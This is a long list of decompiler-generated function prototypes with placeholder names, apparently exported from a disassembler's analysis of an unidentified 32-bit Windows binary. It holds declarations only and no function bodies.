int __thiscall sub_1004C3C6(_DWORD *this, int a2);
int __thiscall sub_1004C3E5(_DWORD *this, int a2);
int __thiscall sub_1004C404(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1004C45F(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_1004C4DB(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1004C550(_DWORD *this);
_DWORD *__stdcall sub_1004C619(_DWORD *a1);
void __thiscall sub_1004C692(_DWORD *this);
int __thiscall sub_1004C6D5(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1004C73D(void *this, int a2, int *a3);
_DWORD *__thiscall sub_1004C766(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1004C797(_DWORD *this, _DWORD *a2);
void *__thiscall sub_1004C7F1(void *Block, char a2);
_DWORD *__thiscall sub_1004C80D(_DWORD *Block, char a2);
// char __userpurge sub_1004C829@<al>(LONG *a1@<eax>, int a2@<ecx>, char a3);
// struct _SYSTEMTIME *__userpurge sub_1004C84F@<eax>(struct _SYSTEMTIME *a1@<esi>, int a2);
_DWORD *__stdcall sub_1004C883(_DWORD *a1);
// _DWORD *__userpurge sub_1004C8FA@<eax>(void *a1@<esi>, _DWORD *a2);
_BYTE *__thiscall sub_1004C94C(_BYTE *Block, char a2);
void *__thiscall sub_1004C968(_BYTE *this);
__int16 __stdcall sub_1004C98C(void *a1);
int __stdcall sub_1004CAB6(void *a1);
int __stdcall sub_1004CC0D(int a1);
BOOL __thiscall sub_1004CC71(void *this);
_DWORD *__stdcall sub_1004CCC0(void *a1, _DWORD *pExceptionObject);
char __stdcall sub_1004CD33(_BYTE *a1);
// char __usercall sub_1004CDAF@<al>(_BYTE *a1@<edi>);
// char __userpurge sub_1004CE34@<al>(_BYTE *a1@<esi>, unsigned __int8 a2);
char __stdcall sub_1004CE95(_BYTE *a1, unsigned __int8 a2);
char __stdcall sub_1004CEED(_BYTE *a1);
char __stdcall sub_1004CF71(_BYTE *a1);
// char __userpurge sub_1004CFD6@<al>(unsigned int a1@<eax>, _BYTE *a2);
_DWORD *__stdcall sub_1004D03B(_DWORD *a1, int a2);
int *__thiscall sub_1004D079(int *Block, char a2);
void __thiscall sub_1004D095(int *this);
// int __userpurge sub_1004D0C3@<eax>(char a1@<cl>, int a2@<esi>, SQLSMALLINT HandleType, SQLHANDLE InputHandle);
void *__thiscall sub_1004D17F(void *Block, char a2);
void __thiscall sub_1004D19B(void *this);
void __cdecl sub_1004D260(__int16 a1);
_DWORD *__thiscall sub_1004D5A4(_DWORD *this, int a2);
// bool __userpurge sub_1004D5E3@<al>(int a1@<ecx>, _DWORD *a2@<esi>, _BYTE *a3);
int *__thiscall sub_1004D61F(int *Block, char a2);
void *__thiscall sub_1004D63B(int *this);
void __stdcall sub_1004D670(int a1);
_DWORD *__stdcall sub_1004DA4B(_DWORD *a1, void *Block, int a3, void *a4);
int *__thiscall sub_1004DB4F(int *Block, char a2);
void __thiscall sub_1004DB6B(int *this);
// int __usercall sub_1004DBC1@<eax>(__int32 a1@<eax>, int a2@<ecx>);
// DWORD __usercall sub_1004DD05@<eax>(int a1@<esi>);
char __cdecl sub_1004DD38(void *a1, void *a2);
_DWORD *__stdcall sub_1004DDEE(_DWORD *a1, _DWORD *Block, void *a3);
_DWORD *__thiscall sub_1004E0DC(_DWORD *Block, char a2);
void __thiscall sub_1004E0F8(_DWORD *this);
int __stdcall sub_1004E149(_DWORD *a1, int a2);
int __stdcall sub_1004E2B2(_DWORD *a1);
// int __userpurge sub_1004E345@<eax>(int a1@<esi>, HKEY phkResult);
// int __userpurge sub_1004E439@<eax>(__int32 a1@<eax>, _DWORD *a2, HKEY phkResult);
int __thiscall sub_1004E5E7(void *this, int a2);
int __thiscall sub_1004E615(int this, int a2);
int __thiscall sub_1004E646(int this, int a2);
_DWORD *__thiscall sub_1004E677(void *this, _DWORD *a2);
int __thiscall sub_1004E6E8(int this, int a2);
_DWORD *__thiscall sub_1004E719(void *this, _DWORD *a2);
_DWORD *__stdcall sub_1004E78A(_DWORD *a1, int a2);
void __thiscall sub_1004E7E4(_DWORD *this);
void __cdecl __noreturn sub_1004E7E8(int a1, int a2);
void __thiscall sub_1004E80D(int *this);
int __thiscall sub_1004E842(int this, int a2);
_DWORD *__stdcall sub_1004E85B(_DWORD *a1, int a2);
LONG *__thiscall sub_1004E8A9(LONG *this);
void __thiscall sub_1004E8DD(int *this);
int *__thiscall sub_1004E904(int *this, char a2);
int *__thiscall sub_1004E938(int *Block, char a2);
int *__thiscall sub_1004E954(int *this, char a2);
int *__thiscall sub_1004E988(int *Block, char a2);
void __thiscall sub_1004E9A4(_DWORD *this);
void __thiscall sub_1004EA07(_DWORD *this, void *a2, unsigned int a3);
int __thiscall sub_1004EAD5(_DWORD *this, unsigned int a2);
int __thiscall sub_1004EB40(_DWORD *this, int a2);
int __thiscall sub_1004EB5F(_DWORD *this, int a2);
void __thiscall sub_1004EB7E(_DWORD *this, unsigned int a2);
int __thiscall sub_1004EBB6(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1004EC08(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_1004EC84(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1004ED2B(_DWORD *this);
void __thiscall sub_1004EE42(_DWORD *this);
int __thiscall sub_1004EE85(_DWORD *this, int a2);
void __thiscall sub_1004EEFE(void *this, int a2, void *a3);
_DWORD *__thiscall sub_1004EF73(_DWORD *this, _DWORD *a2);
void __thiscall sub_1004EFCD(_DWORD *this);
char __thiscall sub_1004F010(_DWORD *this, _DWORD *a2);
int __thiscall sub_1004F05D(_DWORD *this, _DWORD *a2);
int __thiscall sub_1004F0D3(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1004F130(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1004F14C(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1004F168(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1004F184(void *this, _DWORD *a2);
_DWORD *__stdcall sub_1004F1C4(_DWORD *a1);
HANDLE *__thiscall sub_1004F24F(HANDLE *Block, char a2);
void __thiscall sub_1004F26B(HANDLE *this);
void __thiscall sub_1004F292(_DWORD *this, char a2, int a3, int a4, int a5);
void __stdcall sub_1004F436(_DWORD *a1);
void __thiscall sub_1004F466(_DWORD *this, char a2, int a3, char a4, int a5, int a6);
void __thiscall sub_1004F618(_DWORD *this, char a2, int a3, char a4, char a5, int a6, int a7);
void __thiscall sub_1004F7E6(_DWORD *this, char a2, char a3, int a4, int a5);
void __thiscall sub_1004F966(_DWORD *this, char a2, char a3, char a4, int a5, int a6);
void __thiscall sub_1004FAF4(_DWORD *this, char a2, int a3, int a4, char a5, int a6, int a7);
void __thiscall sub_1004FCD8(_DWORD *this, char a2, int a3, int a4, int a5, int a6);
int __fastcall sub_1004FEAE(int a1, int a2, int a3, char a4);
_DWORD *__thiscall sub_1004FEFA(_DWORD *Block, char a2);
void *__thiscall sub_1004FF19(_DWORD *this);
int __thiscall sub_1004FF63(int this, int a2);
int __thiscall sub_10050089(int **this, int a2);
// int __usercall sub_100500E2@<eax>(int **a1@<eax>);
void *__thiscall sub_1005011E(int **this, void *a2);
void __cdecl __noreturn sub_100501AF(int a1, int a2);
_DWORD *__thiscall sub_100501D2(_DWORD *this, int a2);
_DWORD *__thiscall sub_10050220(_DWORD *this, int a2);
int *__thiscall sub_10050267(int *Block, char a2);
void __stdcall sub_10050286(int a1, int a2, unsigned int a3, int a4, char a5);
void *__thiscall sub_100503FE(void *Block, char a2);
void __thiscall sub_1005041D(int this);
// int __usercall sub_10050485@<eax>(int a1@<edi>);
// _DWORD *__userpurge sub_10050505@<eax>(int a1@<ebx>, _DWORD *a2, unsigned __int8 *a3, _DWORD *a4, char *Block);
void __thiscall sub_10050688(int *this);
__int64 __stdcall sub_100506BD(int a1, unsigned __int8 *a2);
__int64 __stdcall sub_10050743(int a1, unsigned __int8 *a2, void *a3);
// int *__userpurge sub_100507F4@<eax>(int a1@<ebx>, int *a2, unsigned __int8 *a3);
int *__thiscall sub_1005083E(void *this, int *a2, unsigned __int8 *a3, void *a4);
void __thiscall sub_100508B5(void *this, int a2, int a3);
void __thiscall sub_100509A5(int *this);
// int __usercall sub_100509C8@<eax>(int a1@<esi>);
_DWORD *__stdcall sub_10050A25(int a1, _DWORD *a2);
BOOL __cdecl sub_10050A67(int a1, int a2);
char __stdcall sub_10050A9E(int a1, int a2);
void *__thiscall sub_10050AEE(_DWORD *this);
_DWORD *__thiscall sub_10050B33(_DWORD *Block, char a2);
char __thiscall sub_10050B52(_DWORD *this);
// _DWORD *__userpurge sub_10050B91@<eax>(_DWORD *a1@<esi>, int a2);
int __stdcall sub_10050BD5(int a1);
_DWORD *__thiscall sub_10050BEC(_DWORD *Block, char a2);
// char *__usercall sub_10050C0B@<eax>(char *a1@<eax>);
int __thiscall sub_10050C29(int this, int a2);
_DWORD *__thiscall sub_10050C7B(_DWORD *this, int a2);
int *__thiscall sub_10050CBC(int *Block, char a2);
int *__thiscall sub_10050CDB(int *Block, char a2);
// char __usercall sub_10050CFA@<al>(int a1@<esi>);
int sub_10050D14();
_DWORD *__stdcall sub_10050D97(_DWORD *a1, int a2);
// LONG *__userpurge sub_10050DD5@<eax>(int a1@<edi>, LONG *a2);
_DWORD *__cdecl sub_10050EF6(_DWORD *a1);
_DWORD *__stdcall sub_1005109F(_DWORD *a1, wchar_t *String);
_DWORD *__thiscall sub_100510EA(_DWORD *this, int a2);
_DWORD *__thiscall sub_10051122(_DWORD *this, int a2);
_DWORD *__stdcall sub_10051163(_DWORD *a1, int a2);
int *__thiscall sub_100511AA(int *Block, char a2);
void __thiscall sub_100511C9(int *this);
_DWORD *__thiscall sub_10051205(LONG *this, _DWORD *a2);
_DWORD *__cdecl sub_100513C8(_DWORD *a1, int a2);
_DWORD *__stdcall sub_10051459(LONG *a1, _DWORD *a2);
int __cdecl sub_10051516(_DWORD *hDevice);
_DWORD *__cdecl sub_100515E0(_DWORD *a1, int a2);
_BYTE *__thiscall sub_1005180A(_BYTE *Block, char a2);
int __stdcall sub_10051829(int, int, volatile LONG *lpAddend); // idb
int __thiscall sub_1005189B(_BYTE *this);
int __thiscall sub_10051902(_DWORD **this);
int __thiscall sub_1005190E(_DWORD **this);
int __thiscall sub_1005191A(_DWORD **this);
int __thiscall sub_10051922(int this);
int __thiscall sub_10051946(_DWORD **this);
int __thiscall sub_1005194E(_DWORD **this, int a2, int a3);
int __thiscall sub_10051978(void *this, int a2);
_BYTE *__thiscall sub_100519F2(_BYTE *Block, char a2);
void *__thiscall sub_10051A11(_BYTE *this);
char __thiscall sub_10051A4C(_BYTE *this, int a2, char a3);
_DWORD *__thiscall sub_10051AA5(_BYTE *this, _DWORD *a2);
void __noreturn sub_10051ADD();
void __noreturn sub_10051AFF();
char sub_10051B21();
int __thiscall sub_10051B24(void *this, _DWORD *pExceptionObject, int (__thiscall **a3)(void *Block, char), int a4);
void __thiscall sub_10051BDF(_DWORD *this);
_DWORD *__thiscall sub_10051C02(_DWORD *Block, char a2);
unsigned int __thiscall sub_10051C21(int this, char *a2, int a3, unsigned int a4, char a5);
void __noreturn sub_10051FB8();
void __noreturn sub_10051FDD();
void __noreturn sub_10052002();
char __thiscall sub_10052027(void *this, _DWORD *a2, unsigned int a3, int a4);
char __stdcall sub_100520F0(char a1, char a2, unsigned __int8 a3);
_DWORD *__thiscall sub_10052153(_DWORD *this, int a2);
_DWORD *__stdcall sub_1005218B(_DWORD *a1, int a2, int a3);
int *__thiscall sub_100521CA(int *Block, char a2);
void __thiscall sub_100521E9(int *this);
char __thiscall sub_10052215(_DWORD **this);
_DWORD *__stdcall sub_100522FD(_DWORD *a1, int a2);
_DWORD *__thiscall sub_10052354(_DWORD *Block, char a2);
void *__thiscall sub_10052373(_DWORD *this);
int __stdcall sub_100523A3(int *a1);
bool __thiscall sub_10052423(int *this);
void __thiscall sub_10052437(int *this, int a2);
void *__thiscall sub_1005252E(_DWORD *this);
_DWORD *__thiscall sub_10052594(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_100525FA(_DWORD *this, _DWORD *a2);
void __thiscall sub_10052660(void *this, int a2);
_DWORD *__thiscall sub_1005269E(_DWORD *Block, char a2);
void **__stdcall sub_100526BD(void **Block);
void **__thiscall sub_100526ED(int this);
int *__thiscall sub_10052775(_DWORD *this, int *a2);
_DWORD *__thiscall sub_1005280C(_DWORD *Block, char a2);
int *__stdcall sub_1005282C(int *a1, int a2, volatile LONG *lpAddend, int a4, int a5);
_DWORD *__thiscall sub_1005287D(_DWORD *this, char a2);
_DWORD *__thiscall sub_1005288C(_DWORD *Block, char a2);
_DWORD *__stdcall sub_100528AC(_DWORD *a1);
_DWORD *__thiscall sub_10052934(_DWORD *Block, char a2);
void __thiscall sub_10052954(int this, _DWORD *a2);
unsigned int __thiscall sub_10052A04(_BYTE *this, _DWORD *a2, _DWORD *a3);
int sub_10052AB3();
int __thiscall sub_10052AB7(void *this, int a2, int a3);
void *__thiscall sub_10052BD9(void *Block, char a2);
int __thiscall sub_10052BF8(int this);
int __thiscall sub_10052C83(char *this, char a2);
void __thiscall sub_10052CA9(_BYTE *this, _DWORD *Size);
void __thiscall sub_10052E4F(_DWORD *this, int a2, int a3, int a4, int a5, int a6);
void __thiscall sub_10052EC3(_DWORD **this);
int __thiscall sub_10052F75(void *this);
void __thiscall sub_10052F8A(_DWORD *this);
// int __usercall sub_10053012@<eax>(unsigned int a1@<ebx>);
// int __usercall sub_10053046@<eax>(int a1@<edi>);
int __thiscall sub_100530A3(int this);
int __cdecl sub_100530C6(int a1);
int __cdecl sub_100530D9(int a1);
// int __usercall sub_100530EC@<eax>(void (__cdecl *a1)(int a1, unsigned int a2)@<eax>, int a2@<ecx>, int a3@<esi>, _BYTE *Src, char a5);
// __int16 __usercall sub_1005310E@<ax>(int a1@<eax>, double a2);
// int __usercall sub_1005312B@<eax>(int a1@<eax>, _BYTE *Src);
// int __usercall sub_1005314B@<eax>(int a1@<eax>, int a2@<ecx>);
// int __usercall sub_1005315D@<eax>(int a1@<eax>, int a2, int a3);
// int __usercall sub_10053178@<eax>(int a1@<eax>);
// int __usercall sub_10053198@<eax>(int a1@<esi>);
// int __usercall sub_100531B1@<eax>(int a1@<eax>);
int __cdecl sub_1005326B(int a1);
// void __usercall sub_10053339(int a1@<edi>, int a2);
// int __usercall sub_1005336A@<eax>(_DWORD *a1@<esi>, int Size);
// _DWORD *__usercall sub_100533C0@<eax>(int a1@<eax>, _DWORD **a2@<esi>);
// void __usercall sub_10053411(int *a1@<edi>);
// int __usercall sub_10053431@<eax>(int a1@<eax>, int *a2@<ecx>);
// int __usercall sub_10053451@<eax>(int a1@<eax>, int *a2@<ecx>);
// int __usercall sub_1005346C@<eax>(int a1@<eax>, int *a2@<ebx>);
// int __usercall sub_100534C0@<eax>(_DWORD **a1@<esi>, int a2);
// int __usercall sub_10053580@<eax>(int a1@<eax>, _DWORD **a2@<edi>, _BYTE *Src, int a4);
// int __usercall sub_100535DD@<eax>(_DWORD *a1@<ebx>, int a2@<edi>);
char __stdcall sub_10053630(int a1);
_DWORD *__stdcall sub_10053676(_DWORD *a1, int a2, int a3);
_DWORD *__stdcall sub_100536F1(_DWORD *a1, int a2);
_DWORD *__stdcall sub_1005373D(_DWORD *a1, int a2, int a3, int a4);
void __thiscall sub_10053794(int *this);
_DWORD *__stdcall sub_100537CF(_DWORD *a1, int a2, int a3);
int __stdcall sub_10053811(int a1, int a2, char a3);
// int __usercall sub_1005387F@<eax>(int a1@<edi>, int a2@<esi>);
// int __usercall sub_10053A19@<eax>(int a1@<edi>, int a2@<esi>, int a3, int a4, int a5, int a6);
// int __usercall sub_10053B81@<eax>(int a1@<eax>, int a2@<esi>, int a3);
// BOOL __usercall sub_10053C4E@<eax>(int a1@<eax>, int a2);
int __cdecl sub_10053C6D(int a1, int a2, void *Buf1, signed int Size, void *Buf2);
int __cdecl sub_10053CCD(int a1, int a2, _BYTE *a3, int a4, unsigned __int8 *a5);
// void __usercall sub_10053CF5(int a1@<esi>);
// int __usercall sub_10053D2E@<eax>(int a1@<eax>);
// int (__cdecl *__usercall sub_10053F1F@<eax>(int a1@<eax>))(_DWORD);
// char *__usercall sub_10053FC9@<eax>(unsigned __int8 a1@<al>);
// int __usercall sub_10053FE4@<eax>(int *a1@<esi>, int a2);
int __cdecl sub_10054017(_DWORD *a1, unsigned __int8 *Src, int a3, int a4, int a5, int a6, int a7, int a8);
// int __usercall sub_10054151@<eax>(_DWORD *a1@<eax>);
// int __usercall sub_100541BA@<eax>(int a1@<ecx>, int a2@<edx>, char *a3@<eax>, int *a4@<edi>, int a5, int a6);
// char *__usercall sub_10054233@<eax>(int a1@<esi>);
// const wchar_t *__usercall sub_1005428D@<eax>(int a1@<esi>);
int __thiscall sub_10054313(void *this);
int __cdecl sub_10054337(_DWORD *a1, unsigned __int8 *Src, unsigned __int8 a3, char a4, int a5, int a6);
// int __usercall sub_1005443F@<eax>(int a1@<edi>, int a2@<esi>, char *a3, _DWORD *a4, int a5, char *Str1);
// void __usercall sub_10054704(int a1@<eax>, int a2);
void __cdecl sub_10054749(int a1, int a2, char *a3, int *a4);
// void __usercall sub_100552D1(int a1@<eax>, int a2@<edi>, _BYTE *Src);
// int __usercall sub_1005539C@<eax>(int a1@<edi>);
// void __usercall sub_100553E9(int *a1@<esi>);
// int __usercall sub_10055400@<eax>(int result@<eax>, int a2@<edx>, int a3@<ecx>, int a4);
// int __usercall sub_10055425@<eax>(int a1@<esi>, char *a2, int *a3);
// int __usercall sub_10055484@<eax>(int a1@<esi>, char *a2, ...);
// int __usercall sub_10055499@<eax>(int a1@<eax>, unsigned int a2, char *a3, ...);
// int __usercall sub_100554C0@<eax>(int a1@<edi>, int a2@<esi>, char *a3, int *a4);
// int __usercall sub_10055521@<eax>(int a1@<edi>, int a2@<esi>, char *a3, ...);
// int __usercall sub_10055543@<eax>(int a1@<edx>, int a2@<ecx>, char *a3, ...);
int __stdcall sub_10055580(int a1);
_DWORD *__thiscall sub_1005566B(_DWORD *Block, char a2);
void __thiscall sub_1005568A(_DWORD *this);
int *__stdcall sub_100556F9(int *a1);
_DWORD *__stdcall sub_10055754(int a1, _DWORD *a2, char a3);
void __stdcall sub_100557BE(int a1, char a2, char a3, int a4);
int __cdecl sub_10055819(int a1, int a2, _DWORD *a3, char a4, _DWORD *a5);
int __cdecl sub_10055D77(int a1, char *String);
int __cdecl sub_10055DE9(int a1, char *String, int a3, BOOL *a4);
int __cdecl sub_10055E59(int, char *Source, size_t Count, char *Destination); // idb
int __cdecl sub_10055E71(int a1, int Src, char *a3);
int __cdecl sub_10055E89(int a1, int a2);
int __cdecl sub_10055F79(int a1, double *a2);
int __cdecl sub_10055F82(int a1, int a2, int a3);
int __cdecl sub_10055F9A(_DWORD *a1);
int __cdecl sub_10056143(char a1, void *a2, void *a3, int a4);
int __cdecl sub_1005621F(char a1, void *Src, size_t Size, int a4);
int __cdecl sub_100562FB(int, LONG lDistanceToMove, int); // idb
int __cdecl sub_10056322(char a1);
int __cdecl sub_100563B8(char a1, _DWORD *a2);
int __cdecl sub_10056444(int a1, int a2);
int __cdecl sub_10056470(int a1, int a2);
int __cdecl sub_1005648D(int a1, BOOL *a2);
int __fastcall sub_100564AA(int a1);
int __fastcall sub_100564BB(int a1);
int *__stdcall sub_100564CF(int *a1);
int *__thiscall sub_10056670(int *Block, char a2);
void __thiscall sub_1005668F(int *this);
int __thiscall sub_1005670D(void *this);
int __thiscall sub_10056763(void *this);
LONG *__cdecl sub_10056793(LONG *a1, char *String);
_DWORD *__stdcall sub_1005695A(int a1, _DWORD *a2);
_DWORD *__cdecl sub_10056994(_DWORD *a1, int a2);
int __cdecl sub_10056A59(int a1);
int __thiscall sub_10056A91(int this, int a2);
int __thiscall sub_10056AC7(int this, int a2);
_DWORD *__thiscall sub_10056AFD(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10056B78(void *this, _DWORD *a2, void *Block);
void __thiscall sub_10056C02(int *this);
_DWORD *__stdcall sub_10056C2E(int a1, _DWORD *a2);
void *__thiscall sub_10056C79(_DWORD *this);
_DWORD *__thiscall sub_10056CDF(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10056D45(_DWORD *this, _DWORD *a2);
int *__thiscall sub_10056DAB(void *this, int *a2, unsigned int a3);
void __thiscall sub_10056E1F(void *this, int a2, int a3);
void __thiscall sub_10056E60(void *this);
int *__thiscall sub_10056EA7(void *this);
int *__thiscall sub_10056EEC(int *Block, char a2);
_DWORD *__thiscall sub_10056F0B(_DWORD *Block, char a2);
void **__stdcall sub_10056F2A(void **Block);
void *__thiscall sub_10056F5A(void *Block, char a2);
int *__stdcall sub_10056F79(int *Block);
int __thiscall sub_10056FB7(void *this, int a2);
_DWORD *__stdcall sub_10056FEA(_DWORD *a1, int a2);
_DWORD *__thiscall sub_1005703C(_DWORD *this);
void __thiscall sub_10057071(_DWORD *this);
void __noreturn sub_10057075();
void __thiscall sub_1005709A(_DWORD *this);
int __thiscall sub_100570C6(int this, int a2);
void **__thiscall sub_100570E2(int this);
int *__thiscall sub_1005716A(_DWORD *this, int *a2);
_DWORD *__thiscall sub_10057201(_DWORD *this, char a2);
_DWORD *__thiscall sub_1005723C(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1005725B(_DWORD *Block, char a2);
int *__stdcall sub_1005727B(int *a1, int a2, volatile LONG *lpAddend, int a4, int a5);
// _DWORD *__usercall sub_100572CC@<eax>(_DWORD *a1@<ecx>, int a2@<edi>);
void *__thiscall sub_10057318(int this);
int __thiscall sub_10057376(_DWORD *this, int *a2, unsigned int a3);
int __thiscall sub_100573D9(_DWORD *this, unsigned int a2);
int __thiscall sub_10057425(_DWORD *this, int a2);
int __thiscall sub_10057446(_DWORD *this, int a2);
int __thiscall sub_10057467(void **this);
int __thiscall sub_1005748B(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_100574CD(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_1005753F(_DWORD *this, int a2, int a3, int a4);
// _DWORD *__usercall sub_1005759D@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
int *__thiscall sub_100575C2(int *this, int *a2);
void *__thiscall sub_10057607(_DWORD *this);
void __thiscall sub_10057668(_DWORD *this, int *a2, unsigned int a3);
int __thiscall sub_10057705(_DWORD *this, unsigned int a2);
int __thiscall sub_1005775F(_DWORD *this, int a2);
int __thiscall sub_10057780(_DWORD *this, int a2);
char *__thiscall sub_100577A1(_DWORD *this, char *a2);
int __thiscall sub_100577CA(int *this);
int __thiscall sub_100577F1(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10057836(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_100578A8(_DWORD *this, int a2, int a3, int a4);
void *__thiscall sub_10057958(_DWORD *this);
_DWORD *__stdcall sub_10057A6E(_DWORD *a1);
void *__thiscall sub_10057B0C(_DWORD *this);
bool __thiscall sub_10057B56(_DWORD *this, _DWORD *a2);
char __thiscall sub_10057B90(_DWORD *this, _DWORD *a2);
int __thiscall sub_10057BDF(_DWORD *this, _DWORD *a2);
void __thiscall sub_10057C5C(void *this, int a2, int *a3);
_DWORD *__thiscall sub_10057CB2(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10057D17(_DWORD *this, _DWORD *a2);
int __stdcall sub_10057D7C(int a1);
// _DWORD *__usercall sub_10057D8D@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_10057DCD(void **this);
void *__thiscall sub_10057E29(void *Block, char a2);
_DWORD *__thiscall sub_10057E48(_DWORD *Block, char a2);
void __thiscall sub_10057E67(_DWORD *this);
_DWORD *__thiscall sub_10057E73(_DWORD *Block, char a2);
int sub_10057E92();
// void __usercall sub_10057F12(_DWORD *a1@<edi>, int a2@<esi>);
// int __usercall sub_10057F7F@<eax>(int a1@<esi>, const char *a2, const char *a3);
int __cdecl sub_10057FF0(int *a1, int a2, int a3);
// int *__usercall sub_10058106@<eax>(int a1@<eax>, int a2, unsigned int *a3);
int *__cdecl sub_100583C2(int a1, unsigned int *a2);
int *__cdecl sub_10058497(_DWORD *a1);
int __cdecl sub_100584C6(_DWORD *a1);
// int __usercall sub_1005855F@<eax>(int a1@<ecx>, int a2@<esi>);
int __cdecl sub_10058584(_DWORD *a1, char *a2, signed int a3, int a4, int a5, unsigned int *a6, _DWORD *a7);
// int __usercall sub_10058816@<eax>(_DWORD *a1@<eax>, unsigned int *a2@<esi>, char *a3, signed int a4, int a5, int a6, _DWORD *a7);
// int __usercall sub_1005889A@<eax>(_DWORD *a1@<eax>);
// int __usercall sub_10058911@<eax>(_DWORD *a1@<edi>, unsigned __int8 *a2, int a3, unsigned int *a4, _DWORD *a5);
int __thiscall sub_100589DA(void *this, unsigned int a2, int a3);
// int __usercall sub_10058A3A@<eax>(int a1@<esi>);
int __cdecl sub_10058B64(int a1);
int __cdecl sub_10058BBD(int a1, int *a2);
int __cdecl sub_10058C4C(int a1);
int __cdecl sub_10058CA3(int a1);
// int __usercall sub_10058CB9@<eax>(int a1@<edi>);
// unsigned int __usercall sub_10058D7F@<eax>(unsigned int result@<eax>);
// BOOL __usercall sub_10058E36@<eax>(unsigned int a1@<eax>, int a2@<ecx>);
int __cdecl sub_10058E55(unsigned int a1);
void __cdecl sub_10058E74(int a1);
void __cdecl sub_10058EC7(int a1, unsigned int a2);
// int __usercall sub_10058EFA@<eax>(int a1@<ebx>, int a2);
// int __usercall sub_10059005@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4);
void *__cdecl sub_10059025(size_t Size);
// _DWORD *__usercall sub_1005904B@<eax>(int a1@<eax>, size_t Size);
// _DWORD *__usercall sub_10059073@<eax>(int a1@<esi>, int a2);
_DWORD *__cdecl sub_100590DA(int a1, void *Src, int a3);
_DWORD *__cdecl sub_10059167(int a1, void *Src, int a3);
_DWORD *__cdecl sub_10059194(_BYTE *Src);
// _DWORD *__usercall sub_100591D0@<eax>(int a1@<ecx>, size_t a2@<edi>, void *Src);
// void __usercall sub_10059206(unsigned int *a1@<edi>, int a2, char *a3, ...);
// int __usercall sub_1005922F@<eax>(int a1@<esi>, int a2);
int __cdecl sub_1005926E();
_BYTE *__fastcall sub_10059297(_BYTE *a1);
// __int16 __usercall sub_100592B1@<ax>(_DWORD *a1@<eax>, int a2, char *a3, ...);
// int __usercall sub_10059320@<eax>(int *a1@<edi>, char *a2, ...);
// void __usercall sub_1005934E(int *a1@<esi>);
int __thiscall sub_10059363(char *this);
int __fastcall sub_100593BE(unsigned __int8 *a1, unsigned __int8 *a2);
// int __usercall sub_100593F9@<eax>(_BYTE *a1@<eax>, int a2@<edx>, unsigned __int8 *a3@<ecx>);
// BOOL __usercall sub_10059441@<eax>(_BYTE *a1@<eax>, _DWORD *a2@<esi>, char a3);
// _BYTE *__usercall sub_100594F4@<eax>(_BYTE *a1@<eax>, double *a2);
// int __usercall sub_100597BC@<eax>(char *a1@<esi>);
// BOOL __usercall sub_100597DB@<eax>(char *a1@<eax>, int *a2);
// BOOL __usercall sub_100598A1@<eax>(char *a1@<eax>, int a2);
// int __usercall sub_100598E8@<eax>(_BYTE *a1@<eax>, int *a2);
// int __usercall sub_10059996@<eax>(_BYTE *a1@<eax>, unsigned __int64 a2);
// int __usercall sub_10059A11@<eax>(_BYTE *a1@<eax>, unsigned int a2@<ecx>);
// char __usercall sub_10059A38@<al>(unsigned __int8 *a1@<eax>, _DWORD *a2@<esi>);
// char __usercall sub_10059BD0@<al>(unsigned __int8 *a1@<ecx>, int *a2@<edi>);
int __cdecl sub_10059C32(unsigned __int64 a1);
// int __usercall sub_10059C56@<eax>(_BYTE *a1@<eax>);
// _BYTE *__usercall sub_10059C70@<eax>(_BYTE *result@<eax>, int a2@<ecx>);
// _DWORD *__usercall sub_10059C8B@<eax>(int a1@<ecx>, int a2@<edi>, int a3);
// BOOL __usercall sub_10059D05@<eax>(int a1@<eax>);
// int __usercall sub_10059D24@<eax>(int a1@<eax>, int a2);
// int __usercall sub_10059D49@<eax>(int a1@<eax>, int a2@<edi>, int a3);
// int __usercall sub_10059E08@<eax>(int a1@<eax>);
// int __usercall sub_10059E4E@<eax>(int a1@<eax>);
// int __usercall sub_10059E94@<eax>(int a1@<eax>, int a2);
// int __usercall sub_10059F0A@<eax>(int a1@<edi>, int a2@<esi>);
// int *__usercall sub_10059F6C@<eax>(int *result@<eax>);
int __cdecl sub_10059FC7(int *a1);
int __cdecl sub_10059FF6(double); // idb
// int __usercall sub_1005A03A@<eax>(int a1@<esi>);
// double __usercall sub_1005A0AF@<st0>(int a1@<esi>);
// void __usercall sub_1005A108(int a1@<esi>);
// int __usercall sub_1005A15D@<eax>(int a1@<eax>);
// int __usercall sub_1005A17E@<eax>(int a1@<eax>);
// int __usercall sub_1005A19D@<eax>(int a1@<eax>);
__int16 __cdecl sub_1005A1F4(int a1);
// int __usercall sub_1005A280@<eax>(int a1@<esi>, int a2, int a3);
// __int16 __usercall sub_1005A2A1@<ax>(int a1@<esi>, double a2);
// _DWORD *__usercall sub_1005A2D8@<eax>(int a1@<edi>);
// BOOL __usercall sub_1005A33C@<eax>(int a1@<eax>);
// __int16 __usercall sub_1005A356@<ax>(int a1@<edi>, int a2@<esi>, __int16 a3);
// int __usercall sub_1005A394@<eax>(_WORD *a1@<ebx>, int a2@<esi>);
// void *__usercall sub_1005A3D5@<eax>(int a1@<esi>, int *a2);
